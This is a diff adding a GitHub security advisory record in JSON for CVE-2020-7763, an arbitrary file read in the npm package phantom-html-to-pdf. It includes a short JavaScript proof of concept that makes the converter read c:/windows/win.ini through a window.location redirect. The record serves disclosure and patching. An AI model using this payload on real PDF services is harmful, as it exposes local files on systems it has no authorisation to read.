@@ -1,0 +1,71 @@
+{
+  "id": "GHSA-6h7f-qwqm-35pp",
+  "summary": "Arbitrary File Read in phantom-html-to-pdf",
+  "details": "This affects the package phantom-html-to-pdf before 0.6.1.\n\n### PoC\n```js\nvar fs = require('fs') var conversion = require(\"phantom-html-to-pdf\")();\nconversion.allowLocalFilesAccess = false conversion({\n    html: \"document.write(window.location='c:/windows/win.ini')\"\n}, function(err, pdf) {\n    var output = fs.createWriteStream('output.pdf') console.log(pdf.logs);\n    console.log(pdf.numberOfPages);\n    pdf.stream.pipe(output);\n});\n```",
+  "aliases": [
+    "CVE-2020-7763"
+  ],
+  "modified": "2025-01-14T08:57:34.579561Z",
+  "published": "2020-11-06T18:06:16Z",
+  "database_specific": {
+    "nvd_published_at": "2020-11-05T14:15:00Z",
+    "cwe_ids": [
+      "CWE-200",
+      "CWE-22"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2020-11-06T18:02:24Z"
+  },
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-7763"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pofider/phantom-html-to-pdf/commit/b5d2da2639a49a95e0bdb3bc0c987cb6406b8259"
+    },
+    {
+      "type": "WEB",
+      "url": "https://snyk.io/vuln/SNYK-JS-PHANTOMHTMLTOPDF-1023598"
+    },
+    {
+      "type": "WEB",
+      "url": "https://www.npmjs.com/package/phantom-html-to-pdf"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "name": "phantom-html-to-pdf",
+        "ecosystem": "npm",
+        "purl": "pkg:npm/phantom-html-to-pdf"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.6.2"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "< 0.6.1",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2020/11/GHSA-6h7f-qwqm-35pp/GHSA-6h7f-qwqm-35pp.json"
+      }
+    }
+  ],
+  "schema_version": "1.6.0",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+    }
+  ]
+}
